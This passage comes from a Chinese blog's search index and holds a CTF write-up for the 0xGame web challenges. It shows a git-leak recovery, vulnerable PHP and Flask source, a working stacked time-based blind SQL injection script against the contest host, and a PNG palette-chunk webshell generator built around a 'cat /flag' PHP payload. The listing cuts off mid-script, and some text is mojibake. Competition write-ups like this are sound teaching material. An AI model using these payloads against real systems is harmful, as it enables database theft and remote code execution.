<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0xGame webï¼ˆå…¨è§£ï¼‰</title>
      <link href="/2023/11/03/0xGame/"/>
      <url>/2023/11/03/0xGame/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame"><a href="#0xGame" class="headerlink" title="0xGame"></a>0xGame</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><strong>main.js</strong></p><p><a href="https://imgse.com/i/piQ4HHA"><img src="https://z1.ax1x.com/2023/11/05/piQ4HHA.png" alt="piQ4HHA.png"></a></p><h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><p>ç®€å•md5å’Œä¼ªåè®®æ–‡ä»¶åŒ…å«</p><p><a href="https://imgse.com/i/piQ4O4P"><img src="https://z1.ax1x.com/2023/11/05/piQ4O4P.png" alt="piQ4O4P.png"></a></p><p>flag:<code>0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;</code></p><h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p>httpè¯·æ±‚å¤´ä¼ªé€ </p><p><a href="https://imgse.com/i/piQ4j9f"><img src="https://z1.ax1x.com/2023/11/05/piQ4j9f.png" alt="piQ4j9f.png"></a></p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>gitæ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Githack.py -u http://120.27.148.152:50013/.git</span><br></pre></td></tr></table></figure><p>downä¸‹æ¥åæŸ¥çœ‹gitè®°å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.27.148.152:50013/.git</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ4v38"><img src="https://z1.ax1x.com/2023/11/05/piQ4v38.png" alt="piQ4v38.png"></a></p><p>ç„¶åæ¢å¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 8a5b670558921bd232d75b29542492f00698298b</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ4xgS"><img src="https://z1.ax1x.com/2023/11/05/piQ4xgS.png" alt="piQ4xgS.png"></a></p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;No IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">sanitize</span>(<span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>. <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡å•¥è¿‡æ»¤ï¼Œå†™ğŸå°±è¡Œ</p><p><a href="https://imgse.com/i/piQ4zjg"><img src="https://z1.ax1x.com/2023/11/05/piQ4zjg.png" alt="piQ4zjg.png"></a></p><p><a href="https://imgse.com/i/piQ5puQ"><img src="https://z1.ax1x.com/2023/11/05/piQ5puQ.png" alt="piQ5puQ.png"></a></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ez-sqli"><a href="#ez-sqli" class="headerlink" title="ez_sqli"></a>ez_sqli</h3><p>æºç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;database&#x27;</span>, <span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;column&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;create&#x27;</span>, <span class="string">&#x27;drop&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;xor&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;where&#x27;</span>]</span><br><span class="line"></span><br><span class="line">conn = MySQLdb.connect(host=<span class="string">&#x27;db&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>, passwd=<span class="string">&#x27;root&#x27;</span>, db=<span class="string">&#x27;ctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    field = request.args.get(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    field = re.sub(<span class="string">r&#x27;\s+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, field)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> s.lower() <span class="keyword">in</span> field.lower():</span><br><span class="line">            <span class="keyword">return</span> s + <span class="string">&#x27; are banned&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;id|name|email&quot;</span>, field):</span><br><span class="line">        field = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        cursor.execute(<span class="string">&#x27;SELECT * FROM userinfo order by %s&#x27;</span> % field)</span><br><span class="line">        res = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, res=res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†åŸºæœ¬æ‰€æœ‰æ³¨å…¥çš„å…³é”®å­—ï¼Œå‘ç°å¯ä»¥å †å æ³¨å…¥</p><p>é¢„ç¼–è¯‘ç»“åˆç›²æ³¨</p><p><strong>exp</strong>ï¼ˆéšæ„å†™çš„ï¼ŒäºŒåˆ†æ³•æœ€åå‘ç°è¿˜æ²¡è¿™ä¸ªè·‘å¾—å¿«hhhï¼‰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        url = <span class="string">&#x27;http://120.27.148.152:50021/?order=&#x27;</span></span><br><span class="line">        <span class="comment"># url =&#x27;http://120.27.148.152:50021/?order=&#x27;</span></span><br><span class="line">        <span class="comment"># payload = &#x27;name;set/**/@sql/**/=/**/CONCAT(&quot;se&quot;,&quot;lect/**/i&quot;,&quot;f(ascii(substr(/**/(se&quot;,&quot;lect/**/col&quot;,&quot;umn_name/**/from/**/info&quot;,&quot;rmation_schema.col&quot;,&quot;umns/**/wh&quot;,&quot;ere/**/ta&quot;,&quot;ble_name=\&#x27;flag\&#x27;/**/limit/**/0,1),/**/&#123;&#125;,1))=&#123;&#125;,sleep(3),1);&quot;);prepare/**/stmt/**/from/**/@sql;EXECUTE/**/stmt;#&#x27;.format(</span></span><br><span class="line">        <span class="comment">#     i, j)</span></span><br><span class="line">        payload = <span class="string">&#x27;name;set/**/@sql/**/=/**/CONCAT(&quot;se&quot;,&quot;lect/**/i&quot;,&quot;f(ascii(substr(/**/(se&quot;,&quot;lect/**/flag/**/from/**/flag),&#123;&#125;,1))=&#123;&#125;,sleep(3),1);&quot;);prepare/**/stmt/**/from/**/@sql;EXECUTE/**/stmt;#&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, j)</span><br><span class="line">        urll = url + payload</span><br><span class="line">        <span class="built_in">print</span>(urll)</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        requests.get(urll)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        time3 = time2 - time1</span><br><span class="line">        <span class="keyword">if</span> time3 &gt;= <span class="number">2</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>mdä¸Šåˆå°±æ³¨å‡ºæ¥å­—æ®µåäº†ï¼Œç»“æœè·‘flagä¸€ç›´è·‘ä¸€åŠæ–­æ‰ï¼Œåˆ°ä¸‹åˆè·‘å‡ºæ¥çš„æ—¶å€™å·²ç»æœ‰è§£äº†~~~</p><p>flagï¼š<code>0xGame&#123;4286b62d-c37e-4010-ba9c-35d47641fb91&#125;</code></p><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$user_dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;image/gif&quot;</span>:</span><br><span class="line">        <span class="variable">$source</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;image/jpeg&quot;</span>:</span><br><span class="line">        <span class="variable">$source</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;image/png&quot;</span>:</span><br><span class="line">        <span class="variable">$source</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid file type!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$user_dir</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;image/gif&quot;</span>:</span><br><span class="line">        <span class="title function_ invoke__">imagegif</span>(<span class="variable">$source</span>, <span class="variable">$filepath</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;image/jpeg&quot;</span>:</span><br><span class="line">        <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$source</span>, <span class="variable">$filepath</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;image/png&quot;</span>:</span><br><span class="line">        <span class="title function_ invoke__">imagepng</span>(<span class="variable">$source</span>, <span class="variable">$filepath</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid file type!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="variable">$filepath</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;avatar&#x27;</span>] = <span class="variable">$filepath</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨äº†<code>imagecreatefromxxx</code>å’Œ<code>imagexxx</code>è¿™ä¸€ç±»çš„å‡½æ•°å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œä¼šå¯¼è‡´äºŒæ¬¡æ¸²æŸ“ï¼Œå‚è€ƒ</p><p><a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/analysis/README.md">https://github.com/hxer/imagecreatefrom-/blob/master/png/analysis/README.md</a></p><p>ç”¨ä»–çš„<code>indexcolor.png</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 poc.py indexcolor.png -p &quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot; -o shell.png</span><br></pre></td></tr></table></figure><p><strong>poc.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: janes</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PNGError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span>(self.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PNG</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    read png file and modify png data to php code, just support index-color</span></span><br><span class="line"><span class="string">    images.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, fname=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> fname:</span><br><span class="line">            self.openpng(fname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">openpng</span>(<span class="params">self, fname</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                self.data = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            err_msg = <span class="string">&quot;open &#123;f&#125; failed&quot;</span>.<span class="built_in">format</span>(f=fname)</span><br><span class="line">            <span class="keyword">raise</span> PNGError(err_msg)</span><br><span class="line">            </span><br><span class="line">        self.read_info()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.signature = self.data[:<span class="number">8</span>]</span><br><span class="line">            self.depth = self.data[<span class="number">0x18</span>]</span><br><span class="line">            self.color_type = self.data[<span class="number">0x19</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> PNGError(<span class="string">&#x27;invalid png data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.check_signature():</span><br><span class="line">            <span class="keyword">raise</span> PNGError(<span class="string">&#x27;check png signature error&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.check_type():</span><br><span class="line">            <span class="keyword">raise</span> PNGError(<span class="string">&#x27;just support index-color images&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.check_plte():</span><br><span class="line">            <span class="keyword">raise</span> PNGError(<span class="string">&#x27;check PLTE chunk error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pos = self.data.find(<span class="string">&#x27;PLTE&#x27;</span>)</span><br><span class="line">        self.plte_len = <span class="built_in">int</span>(self.data[pos-<span class="number">4</span>: pos].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        self.plte_pos = pos-<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_signature</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.signature == <span class="string">&#x27;89504e470d0a1a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_type</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.color_type == <span class="string">&#x27;03&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_plte</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.data.find(<span class="string">&#x27;PLTE&#x27;</span>) != -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_payload</span>(<span class="params">self, payload</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        set php code payload</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        code_len = <span class="built_in">len</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> code_len &gt; self.depth*<span class="number">3</span>:</span><br><span class="line">            err_msg = <span class="string">&quot;payload is too long, can&#x27;t to add to png PLTE chunk&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> PNGError(err_msg)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_payload</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.payload) &lt;= self.plte_len</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">crc</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%08x&#x27;</span> % (binascii.crc32(data) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_plte</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.check_payload():</span><br><span class="line">            im = <span class="built_in">list</span>(self.data)</span><br><span class="line">            payload_pos = self.plte_pos + <span class="number">8</span></span><br><span class="line">            <span class="comment"># modify data to php code</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.payload)):</span><br><span class="line">                